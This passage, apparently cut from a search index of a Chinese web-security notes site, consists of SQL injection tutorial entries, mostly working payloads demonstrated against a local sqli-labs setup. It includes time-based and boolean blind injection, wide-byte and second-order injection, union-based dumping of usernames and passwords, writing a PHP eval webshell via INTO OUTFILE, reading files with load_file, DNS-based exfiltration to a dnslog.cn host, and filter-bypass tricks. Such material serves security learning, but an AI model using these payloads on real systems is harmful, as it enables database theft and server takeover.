sec select * from users where id=1 and (SELECT count(*) FROM information_schema.tables A, information_schema.columns B); 0.11 sec select * from users where id=1 and (SELECT count(*) FROM information_schema.tables A, information_schema.tables B); 0.02 sec \u914d\u5408\u67e5\u8be2\u8bed\u53e5\u4e00\u8d77\uff0c\u5982\u679c\u8981\u67e5\u8be2\u7684\u7ed3\u679c\u4e3a\u771f\uff0c\u5219\u4f1a\u9020\u6210\u5ef6\u65f6\u5e76\u663e\u793a\u6570\u636e\u3002\u5982\u679c\u8981\u67e5\u8be2\u7684\u7ed3\u679c\u4e3a\u5047\uff0c\u5219\u4e0d\u4f1a\u4ea7\u751f\u5ef6\u65f6\u5e76\u4e14\u4e0d\u4f1a\u663e\u793a\u6570\u636e select*from users where id=1 and (ascii(substr(database(),1,1))>100) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B);","title":"\u7b1b\u5361\u5c14\u79ef"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#get_lock","text":"get_lock(str,timeout) \u5bf9\u4e00\u4e2a\u5b57\u7b26\u4e0a\u9501,\u5728\u65b0\u56de\u8bdd\u5f00\u542f\u540e,\u518d\u6b21\u4f7f\u7528\u8fd9\u4e2a\u5b57\u7b26\u4f1a\u6709\u5ef6\u65f6","title":"GET_LOCK()"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#rlike-regexp","text":"\u901a\u8fc7 rpad \u6216 repeat \u6784\u9020\u957f\u5b57\u7b26\u4e32\uff0c\u52a0\u4ee5\u8ba1\u7b97\u91cf\u5927\u7684pattern\uff0c\u901a\u8fc7repeat\u7684\u53c2\u6570\u53ef\u4ee5\u63a7\u5236\u5ef6\u65f6\u957f\u77ed\u3002 select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');","title":"RLIKE REGEXP\u6b63\u5219\u5339\u914d"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_11","text":"\u5b58\u5728\u4f7f\u7528 preg_replace() \u3001 addslashes() \u3001 mysqli_real_escape_string() \u3001 get_magic_quotes_gpc() \u7b49\u51fd\u6570\u52a0\u5165 \\ \u8f6c\u4e49\uff0c\u5e76\u4e14\u7f16\u7801\u8bbe\u7f6e\u4e3agbk\uff0c\u53ef\u4ee5\u8003\u8651\u662f\u5426\u5b58\u5728\u5bbd\u5b57\u8282\u6ce8\u5165 preg_replace() \u51fd\u6570\u9700\u8981\u81ea\u5b9a\u4e49\u8f6c\u4e49\u66ff\u6362\u54ea\u4e9b\u5b57\u7b26 addslashes() \u51fd\u6570\u8fd4\u56de\u5728\u9884\u5b9a\u4e49\u7684\u5b57\u7b26\uff08\u5355\u5f15\u53f7\uff08'\uff09\u3001 \u53cc\u5f15\u53f7\uff08\"\uff09\u3001 \u53cd\u659c\u6760\uff08\\\uff09\u3001 NULL\uff09\u524d\u6dfb\u52a0\u53cd\u659c\u6760\u7684\u5b57\u7b26\u4e32 mysqli_real_escape_string() \u51fd\u6570\u8f6c\u4e49\u5728 SQL \u8bed\u53e5\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3002(\u7f16\u7801\u7684\u5b57\u7b26\u662f NUL\uff08ASCII 0\uff09\u3001\\n\u3001\\r\u3001\\\u3001'\u3001\" \u548c Control-Z) get_magic_quotes_gpc() \u5c06post\u3001get\u3001cookie\u8fc7\u6765\u7684\u6570\u636e\u589e\u52a0\u8f6c\u4e49\u5b57\u7b26 \\ \uff0c\u8fc7\u6ee4\u7684\u6570\u636e\u6709\u5355\u5f15\u53f7(')\u3001\u53cc\u5f15\u53f7(\")\u3001\u53cd\u659c\u6760()\u4e0eNULL(NULL\u5b57\u7b26) \u6b64\u7f16\u7801\u683c\u5f0f \u4e24\u4e2a\u5b57\u8282 \u4ee3\u8868 \u4e00\u4e2a\u6c49\u5b57 \u6211\u4eec\u8f93\u5165\u5355\u5f15\u53f7 ' \uff0c\u540e\u7aef\u6dfb\u52a0\u8f6c\u4e49\u7b26\u53f7\uff0c \\ \u7684GBK16\u8fdb\u5236\u7f16\u7801\u4e3a %5c \uff0c ' \u7684GBK16\u8fdb\u5236\u7f16\u7801\u4e3a %27 \uff0c\u8fd9\u662f\u6b63\u5e38\u8f6c\u4e49\u6d41\u7a0b \u4f46\u662f\u6211\u4eec\u524d\u7aef\u4f20\u503c\u4e3a %df' \uff0c\u62fc\u63a5\u4e0a\u8f6c\u4e49\u7684\u7f16\u7801 %df%5c \u662f\u7e41\u4f53\u5b57 \u904b \uff0c\u6211\u4eec\u7528\u8fd9\u79cd\u65b9\u6cd5\u6765\u4e0e \\ \u62fc\u6210\u65b0\u7684\u5b57\u7b26\uff0c\u4ee5\u6b64\u6765\u7ed5\u8fc7\u540e\u7aef\u8f6c\u4e49 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020payload -1%df' union select 1,2,3 -- - SELECT * FROM users WHERE id='-1\u904b' union select 1,2,3 -- -' LIMIT 0,1","title":"\u5bbd\u5b57\u8282\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_12","text":"\u6ce8\u518c\u65f6\u7279\u6b8a\u6784\u9020\u7528\u6237\u540d\u5199\u5165\u6570\u636e\u5e93\uff0c\u518d\u5229\u7528update\u91cd\u7f6e\u65f6\u6ca1\u6709\u8f6c\u4e49\u9020\u6210sql\u62fc\u63a5\u6ce8\u5165 \u53ef\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff1a\uff08\u767b\u5f55\u9875\u9762\u548c\u6ce8\u518c\u9875\u9762\u5bf9\u4e8e\u5bc6\u7801\u548c\u8d26\u6237\u540d\u90fd\u4f7f\u7528mysql_real_escape_string\u51fd\u6570\u5bf9\u4e8e\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\uff09 \u767b\u5f55\u8f93\u5165\u3010\u7528\u6237\u540d\u3011\u3010\u5bc6\u7801\u3011 SELECT * FROM users WHERE username='$username' and password='$password' \u4fee\u6539\u5bc6\u7801\u8f93\u5165\u3010\u73b0\u5bc6\u7801\u3011\u3010\u65b0\u5bc6\u7801\u3011\u3010\u91cd\u590d\u65b0\u5bc6\u7801\u3011 UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \u6ce8\u518c\u8f93\u5165\u3010\u7528\u6237\u540d\u3011\u3010\u5bc6\u7801\u3011 insert into users (username, password) values(\\\"$username\\\", \\\"$pass\\\") \u6211\u4eec\u53ea\u9700\u8981\u6ce8\u518c\u4e2a\u8d26\u53f7\u53eb \u8d26\u53f7\uff1aadmin'# \u5bc6\u7801\uff1a123 \u767b\u5f55\u540e\u4fee\u6539\u5bc6\u7801 new password\uff1aabc retype password\uff1aabc \u6784\u9020\u6210\u7684\u67e5\u8be2\u8bed\u53e5 UPDATE users SET PASSWORD='abc' where username='admin'#' and password='123' admin\u7684\u5bc6\u7801\u5373\u88ab\u91cd\u7f6e\u4e3aabc\u4e86","title":"\u4e8c\u6b21\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_13","text":"mysqli_multi_query() \u51fd\u6570\u6267\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u9488\u5bf9\u6570\u636e\u5e93\u7684\u67e5\u8be2\u3002\u533a\u522b\u4e8e`mysqli_query()`` mysqli_store_result \u8f6c\u79fb\u4e0a\u4e00\u6b21\u67e5\u8be2\u8fd4\u56de\u7684\u7ed3\u679c\u96c6 mysqli_fetch_row() \u51fd\u6570\u4ece\u7ed3\u679c\u96c6\u4e2d\u53d6\u5f97\u4e00\u884c\uff0c\u5e76\u4f5c\u4e3a\u679a\u4e3e\u6570\u7ec4\u8fd4\u56de mysqli_more_results() \u51fd\u6570\u68c0\u67e5\u4e00\u4e2a\u591a\u67e5\u8be2\u662f\u5426\u6709\u66f4\u591a\u7684\u7ed3\u679c\u3002 \u5173\u952e\u70b9\u5c31\u5728\u8fd9\u4e2a mysqli_multi_query() \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u6267\u884c\u591a\u6761SQL\u8bed\u53e5\uff0c\u4ee5\u81f3\u4e8e\u6211\u4eec\u53ef\u4ee5 \u5806\u53e0\u6ce8\u5165 \uff0c\u8f93\u5165\u591a\u6761\u67e5\u8be2\u8bed\u53e5\uff08\u4ee5 ; \u4e3a\u95f4\u9694\u7b26\uff09 \u5806\u53e0\u6ce8\u5165\u600e\u4e48\u6d4b? \u95ed\u5408\u540e\u52a0\u4e2a ; \u4e0d\u62a5\u9519\uff0c\u5e94\u8be5\u5c31\u662f\u53ef\u4ee5\u5806\u53e0\u6ce8\u5165 1';insert into users(id,username,password) values ('20','123','123')-- -","title":"\u5806\u53e0\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#order-by","text":"","title":"order by\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_14","text":"$sql=\"SELECT * FROM users ORDER BY $id\"; sql\u8bed\u53e5\u53c2\u6570\u6ca1\u6709\u5f15\u53f7\u4e14\u4e0d\u80fd\u4f7f\u7528\u8054\u5408\u6ce8\u5165\uff0c\u6709\u62a5\u9519\u663e\u793a\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528updatexml\u8fdb\u884c\u62a5\u9519 \u56e0\u4e3a \u62a5\u9519\u51fd\u6570\u663e\u793a\u5b57\u7b26\u4f4d\u6570\u6709\u9650\uff0c\u6700\u957f\u662f32\u4f4d \uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5 limit\u9010\u884c\u8f93\u51fa substr\u622a\u53d6\u5b57\u7b26\u4e32(\u622a\u53d6\u65f6\u5019\u628a\u63e1\u572832\u4f4d\u4ee5\u5185) ?sort=1 and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),30,30)),0) //XPATH syntax error: '~mysql,omg,performance_schema,s'","title":"\u6570\u5b57\u578b\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_15","text":"$sql = \"SELECT * FROM users ORDER BY '$id'\"; order by\u540e\u9762\u8ddf**\u6570\u5b57**\u6216**\u5b57\u6bb5\u540d**\uff0c\u5355\u5f15\u53f7\u95ed\u5408\u7684\u53ea\u80fd\u8ddf\u5b57\u6bb5\u540d\u4e86 \u82e5\u586b\u5199\u5176\u4ed6\u5b57\u7b26\uff0c\u5219\u9ed8\u8ba4\u6309\u7b2c\u4e00\u5217\u6392\u5e8f ?sort=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,'~',password) from users),1,30)),0) and '1 //XPATH syntax error: '~Dumb~Dumb,Angelina~I-kill-you,'","title":"\u5b57\u7b26\u578b\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_16","text":"\u4e0d\u56de\u663e\u62a5\u9519\u4fe1\u606f\u7684\u8bdd\uff0c\u9488\u5bf9\u6570\u5b57\u578bsql\u8bed\u53e5\u53ea\u80fd\u4f7f\u7528**order by rand()\u5e03\u5c14\u76f2\u6ce8\uff1a** \u6211\u4eec\u8003\u8651\u7684\u70b9\u5e94\u8be5\u662f\u600e\u4e48\u627e\u5230\u5e03\u5c14\u76f2\u6ce8\u7684 0 \u548c 1 \u8fd9\u65f6\u5019\u7528\u5230 rand() \u51fd\u6570\u4e86\uff0c\u914d\u5957 order by \u4f7f\u7528\u6548\u679c\u5982\u4e0b $sql=\"SELECT * FROM users ORDER BY $id\"; order by rand(false) order by rand(true) \u4e24\u79cd\u6392\u5e8f\u540e\u7684\u7ed3\u679c\u4e0d\u540c\uff0c\u4e5f\u5c31\u80fd\u5224\u65ad\u51fasql\u8bed\u53e5\u7684\u5e03\u5c14\u503c\u4e86 ?sort=rand(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=0) //\u8fd4\u56de\u9519\u8bef\u7684\u90a3\u79cd\u6392\u5e8f\u7ed3\u679c ?sort=rand(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105) //\u8fd4\u56de\u6b63\u786e\u7684\u90a3\u79cd\u6392\u5e8f\u7ed3\u679c","title":"\u5e03\u5c14\u76f2\u6ce8"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_17","text":"\u4e0d\u56de\u663e\u62a5\u9519\u4fe1\u606f\u7684\u8bdd\uff0c\u9488\u5bf9\u5b57\u7b26\u578bsql\u8bed\u53e5\u53ea\u80fd\u4f7f\u7528**order by rand()\u65f6\u95f4\u76f2\u6ce8\uff1a** ?sort=1' and if(1=1,sleep(0.05),null) and '0 SELECT * FROM users ORDER by '1' and if(1=1,sleep(0.1),null) and '0' \u5f53 order by \u540e\u9762\u7684\u503c\u662f\u6b63\u786e\u7684\u65f6\u5019\u624d\u4f1a\u6267\u884c\u540e\u9762\u7684 if \u8bed\u53e5 order by \u7684\u904d\u5386\u673a\u5236\u662f**\u904d\u5386\u6240\u6709\u884c**\uff0c\u6240\u4ee5\u6bcf\u6709\u4e00\u884c\uff0csleep()\u5c31\u4f1a\u6267\u884c\u4e00\u6b21\uff0c\u6240\u4ee5\u8fd9\u4e2asleep()\u7684\u503c\u4e0d\u8981\u592a\u5927 1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105,sleep(0.1),null) and '1","title":"\u65f6\u95f4\u76f2\u6ce8"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_18","text":"insert\u8bed\u53e5\u4f1a\u6839\u636evarchar(n)\u6765\u9650\u5236\u5b57\u7b26\u4e32\u6700\u5927\u957f\u5ea6 \u5982\u679c\u6211\u4eec\u6ce8\u518c admin 1 \u7684\u7528\u6237\uff0csql\u56de\u5148\u6267\u884cselect\u770b\u6709\u6ca1\u6709 admin 1 \u8fd9\u4e2a\u7528\u6237 \u53d1\u73b0\u6ca1\u6709\uff0c\u7136\u540e\u63d2\u5165\u6570\u636e\uff0c\u53d1\u751f\u4e86\u622a\u65ad\uff0c\u53ea\u80fd\u63d2\u5165\u524d5\u4f4d\uff0c\u5bf9\u5e94\u5b57\u6bb5\u5c31\u591a\u4e86\u4e00\u4e2a\u503c\u4e3a admin \u7684\u884c\uff0c\u7136\u540e\u4efb\u610f\u767b\u5f55","title":"\u7ea6\u675f\u653b\u51fb"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_19","text":"","title":"\u5229\u7528\u65b9\u6cd5"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#information_schema","text":"http://localhost/sqli/Less-1/?id=1' and '1'='1 \u5bf9\u5e94\u7684\u67e5\u8be2\u8bed\u53e5 SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1 //\u8fd4\u56de\u6b63\u786e\u9875\u9762 http://localhost/sqli/Less-1/?id=1' and '1'='2 \u5bf9\u5e94\u7684\u67e5\u8be2\u8bed\u53e5 SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1 //\u8fd4\u56de\u7a7a\u503c \u7136\u540e\u5224\u65ad\u5b57\u6bb5\u6570\u91cf http://localhost/sqli/Less-1/?id=1' order by 3 -- - //\u9875\u9762\u6b63\u5e38\u663e\u793a SELECT * FROM users WHERE id='1' ORDER BY 3 -- -' LIMIT 0,1 http://localhost/sqli/Less-1/?id=1' order by 4 -- - //\u62a5\u95191054 - Unknown column '4' in 'order clause' SELECT * FROM users WHERE id='1' ORDER BY 4 -- -' LIMIT 0,1 \u4ee5\u6b64\u53ef\u63a8\u65ad\u5b57\u6bb5\u6570\u4e3a3\u4e2a \u7136\u540e**\u67e5\u770b\u9875\u9762\u663e\u793a\u7684\u5b57\u6bb5\u6709\u54ea\u4e9b** http://localhost/sqli/Less-1/?id=1' union select 1,2,3 -- - SELECT * FROM users WHERE id='0' union select 1,2,3 -- -' LIMIT 0,1 //\u8fd9\u65f6\u5019id\u8981\u4e48\u7ed9\u9519\u8bef\u503c\u3001\u8981\u4e48\u4e3a\u7a7a\uff0c\u4e0d\u7136\u56e0\u4e3a\u662f\u8054\u5408\u67e5\u8be2\u8fd8\u662f\u4f1a\u8f93\u51fa\u8d26\u53f7\u5bc6\u7801 \u53ef\u4ee5\u770b\u5230\u9875\u9762\u663e\u793a\u51fa\u4e3a\u5b57\u6bb5**2,3** \u663e\u793a\u6570\u636e\u5e93\u540d\u548c\u767b\u5f55\u7528\u6237 http://localhost/sqli/Less-1/?id=0' union select 1,DATABASE(),USER() -- - SELECT * FROM users WHERE id='0' union select 1,DATABASE(),USER() -- -' LIMIT 0,1 \u67e5\u770b\u6570\u636e\u5e93\u7684\u6240\u6709\u8868 http://localhost/sqli/Less-1/?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 -- - SELECT * FROM users WHERE id='0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 -- -' LIMIT 0,1 \u67e5\u8be2\u8868\u4e0b\u7684\u6240\u6709\u5b57\u6bb5 http://localhost/sqli/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users' ),3 -- - SELECT * FROM users WHERE id='0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users' ),3 -- -' LIMIT 0,1 \u67e5\u8be2\u6240\u6709\u7528\u6237\u540d\u7528\u6237\u540d\u5bc6\u7801 http://localhost/sqli/Less-1/?id=0' union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- - SELECT * FROM users WHERE id='0' union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -' LIMIT 0,1 concat_ws() \u51fd\u6570\u662f\u4e00\u4e2a\u62fc\u63a5\u5b57\u7b26\u4e32\u51fd\u6570\uff0c\u95f4\u9694\u7b26\u4f7f\u7528**0x7e**\uff0c\u4ee3\u8868\u7684\u662f ~ \u7b26\u53f7","title":"information_schema\u5957\u8def"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#into-oufileshell","text":"\u5c1d\u8bd5\u6267\u884cinto outfile\u53d1\u73b0\u62a5\u9519 show variables like '%secure%'; \u5176\u4e2d\u6709\u4e2asecure-file-priv\u53c2\u6570\uff1a secure_file_priv\u7684\u503c\u4e3anull \uff0c\u8868\u793a\u9650\u5236mysqld\u4e0d\u5141\u8bb8\u5bfc\u5165|\u5bfc\u51fa secure_file_priv\u7684\u503c\u4e3a/tmp/ \uff0c\u8868\u793a\u9650\u5236mysqld\u7684\u5bfc\u5165|\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728/tmp/\u76ee\u5f55\u4e0b secure_file_priv\u7684\u503c\u6ca1\u6709\u5177\u4f53\u503c\u65f6\uff0c\u8868\u793a\u4e0d\u5bf9mysqld\u7684\u5bfc\u5165|\u5bfc\u51fa\u505a\u9650\u5236 \u6211\u4eec\u9700\u8981\u624b\u52a8\u4fee\u6539my.ini\u6587\u4ef6\u4e2dsecure-file-priv\u7684\u503c\u4e3a\u7a7a secure_file_priv= \uff0c\u91cd\u542fmysql \u5199\u5165\u4e00\u53e5\u8bdd\uff1a ')) union select \" <?php @ eval ( $_POST [ 'sql' ]); ?> \" into outfile '\u8def\u5f84' http://127.0.0.1/sqlilabs2/Less-7/index.php?id=-1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile \"E:\\softs\\phpstudy_pro\\WWW\\sqlilabs2\\Less-7\\mm2.php\"--+ \u5199\u5165\u9700\u8981\u6ce8\u610f\u7684\uff1a \u5199\u5165\u7684\u5185\u5bb9\u9700\u8981\u7528hex\u8f6c\u7801\uff0c\u4ee5\u9632\u62e6\u622a \u5199\u5165\u7684\u524d\u63d0\u9700\u8981\u77e5\u9053\u7269\u7406\u6587\u4ef6\u8def\u5f84 \u5199\u5165\u7684\u524d\u63d0\u662f\u6709\u6743\u9650\u5199\u5165\uff0c\u6216\u8005\u6709\u914d\u7f6e\u5199\u5165\u7684\u6743\u9650","title":"into oufile\u5199shell"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#load_file","text":"?id=1'and 1=2 union select 1,load_file('D:\\\\wamp\\\\www\\\\111.php')%23 ?id=1'and 1=2 union select 1,load_file(0x443A2F77616D702F7777772F312E706870)%23","title":"load_file\u8bfb\u6587\u4ef6"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#mysql-dnslog","text":"\u524d\u63d0\u6761\u4ef6\u4f9d\u65e7\u662fmysql.ini\u4e2dsecure_file_priv\u5fc5\u987b\u4e3a\u7a7a ' and if((select load_file(concat('\\\\\\\\',(select database()),'.4s1b2n.dnslog.cn'))),1,0)--+ \u653b\u51fb\u8005 --\u53d1\u9001payload\u2013>web\u670d\u52a1\u5668---->\u6570\u636e\u5e93(\u89e3\u6790load file\u51fd\u6570)---->\u6839\u636e\u8bed\u53e5\u5305\u542b\u7684\u57df\u540d\u8bbf\u95ee\u672c\u5730dns\u670d\u52a1\u5668\u2013\u4e0d\u80fd\u89e3\u6790\u53d1\u9001\u5230\u2013>\u516c\u7f51\u4e0adns\u670d\u52a1\u5668\u89e3\u6790\u2013\u89e3\u6790\u5b8c\u6210\u540e\u2013>dns\u672c\u5730\u670d\u52a1\u5668---->\u653b\u51fb\u8005\u670d\u52a1\u5668 \u56e0\u4e3a\u5728\u6570\u636e\u5e93\u4e2d\u5df2\u7ecf\u628a\u8981\u6267\u884c\u7684\u547d\u4ee4\u5e26\u5165\u5230dns\u89e3\u6790\u4e2d\u53bb\u4e86\uff0cdns\u670d\u52a1\u5668\u518d\u53d1\u9001\u7ed9\u653b\u51fb\u8005\u670d\u52a1\u5668\uff0c\u5c31\u53ef\u4ee5\u641c\u5230\u524d\u7f00\uff0c\u524d\u7f00\u5c31\u662f\u6211\u4eec\u60f3\u5f97\u5230\u7684\u4fe1\u606f\u3002","title":"MySQL DNSlog\u76f2\u6253"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_20","text":"","title":"\u8fc7\u6ee4\u7ed5\u8fc7"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_21","text":"**\u6ce8\u91ca\u7b26**\u7ed5\u8fc7\uff1a \u5982\u679c\u53ea\u8fc7\u6ee4\u4e86\u7a7a\u683c\uff0c\u6ca1\u6709\u8fc7\u6ee4 /* \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528 /**/ \u6765\u7ed5\u8fc7\u7a7a\u683c\u8fc7\u6ee4\uff0cSqlmap\u4f7f\u7528\u547d\u4ee4: --tamper=space2comment.py **\u5185\u8054\u6ce8\u91ca**\u7ed5\u8fc7\uff1a \u5f53MySQL\u6570\u636e\u5e93\u7248\u672c\u5927\u4e8e\u7b49\u4e8e5.55.55\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u5185\u8054\u6ce8\u91ca /!**/ \uff0c\u5982\uff1a /*!union*/ \u3001 /*!select*/ \u6216 /*!50000union*/ \u7b49 Sqlmap\u4e2d\u5173\u4e8e\u5185\u8054\u6ce8\u91ca\u7684\u811a\u672c\uff1aversionedmorekeywords.py \u548c halfversionedmorekeywords.py **\u53cc\u7a7a\u683c**\u7ed5\u8fc7\uff1a \u7528**\u62ec\u53f7**\u7ed5\u8fc7\uff1a 'and(updatexml(1,concat(0x7e,database()),1))and'1'='1 \u7528**\u56de\u8f66**\u7ed5\u8fc7\uff1aascii\u7801\u4e3achr(13)&chr(10)\uff0curl\u7f16\u7801\u4e3a%0d%0a \u7528**\u6362\u884c\u7b26**\u7ed5\u8fc7\uff1aurl\u7f16\u7801\u4e3a%0a","title":"\u8fc7\u6ee4\u4e86\u7a7a\u683c"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#sql_2","text":"function blacklist($id) { $id = preg_replace('/[\\s]/',\"\",$id); //\u8fc7\u6ee4 \u7a7a\u683c %20 $id = preg_replace('/or/',\"\",$id); //\u8fc7\u6ee4 or $id = preg_replace('/and/',\"\",$id); //\u8fc7\u6ee4 and $id = preg_replace('/union/',\"\",$id); //\u8fc7\u6ee4 union $id = preg_replace('/by/',\"\",$id); //\u8fc7\u6ee4 by $id = preg_replace('/select/',\"\",$id); //\u8fc7\u6ee4 select $id = preg_replace('/from/',\"\",$id); //\u8fc7\u6ee4 from $id = preg_replace('/floor/',\"\",$id); //\u8fc7\u6ee4 floor $id = preg_replace('/concat/',\"\",$id); //\u8fc7\u6ee4 concat $id = preg_replace('/count/',\"\",$id); //\u8fc7\u6ee4 count $id = preg_replace('/rand/',\"\",$id); //\u8fc7\u6ee4 rand $id = preg_replace('/group by/',\"\",$id); //\u8fc7\u6ee4 group by $id = preg_replace('/substr/',\"\",$id); //\u8fc7\u6ee4 substr $id = preg_replace('/ascii/',\"\",$id); //\u8fc7\u6ee4 ascii $id = preg_replace('/mid/',\"\",$id); //\u8fc7\u6ee4 mid $id = preg_replace('/like/',\"\",$id); //\u8fc7\u6ee4 like $id = preg_replace('/sleep/',\"\",$id); //\u8fc7\u6ee4 sleep $id = preg_replace('/when/',\"\",$id); //\u8fc7\u6ee4 when $id = preg_replace('/order/',\"\",$id); //\u8fc7\u6ee4 order return $id; } \u7531\u4e8e\u8fd9\u91cc\u8fc7\u6ee4\u5e76\u6ca1\u6709\u533a\u5206\u5927\u5c0f\u5199\uff0c\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5**\u5927\u5c0f\u5199\u7ed5\u8fc7** sqlmap \u4e2d\u4e5f\u6709\u4e13\u95e8\u7684\u968f\u673a\u5927\u5c0f\u5199\u7684\u7ed5\u8fc7\u811a\u672c randomcase.py","title":"\u533a\u5206\u5927\u5c0f\u5199\u8fc7\u6ee4\u4e86SQL\u5173\u952e\u8bcd"},{"location":"Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#sql_3","text":"function blacklist($id) { $id = preg_replace('/[\\s]/',\"\",$id); //\u8fc7\u6ee4 \u7a7a\u683c %20 $id = preg_replace('/or/i',\"\",$id); //\u8fc7\u6ee4 or $id = preg_replace('/and/i',\"\",$id); //\u8fc7\u6ee4 and $id = preg_replace('/union/i',\"\",$id); //\u8fc7\u6ee4 union $id = preg_replace('/by/i',\"\",$id); //\u8fc7\u6ee4 by $id = preg_replace('/select/i',\"\",$id); //\u8fc7\u6ee4 select $id = preg_replace('/from/i',\"\",$id); //\u8fc7\u6ee4 from $id = preg_replace('/floor/i',\"\",$id); //\u8fc7\u6ee4 floor $id = preg_replace('/count/i',\"\",$id); //\u8fc7\u6ee4 count $id = preg_replace('/rand/i',\"\",$id); //\u8fc7\u6ee4 rand $id = preg_replace('/group by/i',\"\",$id); //\u8fc7\u6ee4 group by $id = preg_replace('/substr/i',\"\",$id); //\u8fc7\u6ee4 substr $id = preg_replace('/ascii/i',\"\",$id); //\u8fc7\u6ee4 ascii $id = preg_replace('/mid/i',\"\",$id); //\u8fc7\u6ee4 mid $id = preg_replace('/like/i',\"\",$id); //\u8fc7\u6ee4 like $id = preg_replace('/sleep/i',\"\",$id); //\u8fc7\u6ee4 sleep $id = preg_replace('/when/i',\"\",$id); //\u8fc7\u6ee4 when $id = preg_replace('/order/i',\"\",$id); //\u8fc7\u6ee4 order return $id; } \u7b2c\u4e00\u5c1d\u8bd5**\u53cc\u5199\u7ed5\u8fc7** sqlmap \u4e2d\u53cc\u62fc\u7ed5\u8fc7\u7684\u811a\u672c nonrecursivereplacement.py \u7b2c\u4e8c\u770b\u662f\u5426\u6709\u5173\u952e\u8bcd\u6f0f\u8fc7\u6ee4\u4e86\uff08 \u8fc7\u6ee4\u7f3a\u5931 \uff09 \u4f7f\u7528SQL\u5173\u952e\u8bcd\u6765\u8fdb\u884cfuzz\uff0c\u770b\u770b\u54ea\u4e9b\u5173\u952e\u8bcd\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff08\u540e\u7eed\u8865\u5145\uff09 where select from floor concat count rand group by extractvalue limit updatexml join exp left right substr ascii mid ord regexp rlike like sleep if length benchmark information_schema get_lock rpad load_file case \u7b2c\u4e09\u5c31\u662f\u4f7f\u7528**\u7b49\u4ef7\u51fd\u6570\u66ff\u6362** substr \u3001substring \u3001mid \u90fd\u8fc7\u6ee4\u4e86\u7684\u8bdd\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 left() sleep \u53ef\u4ee5\u7528 benchmark() 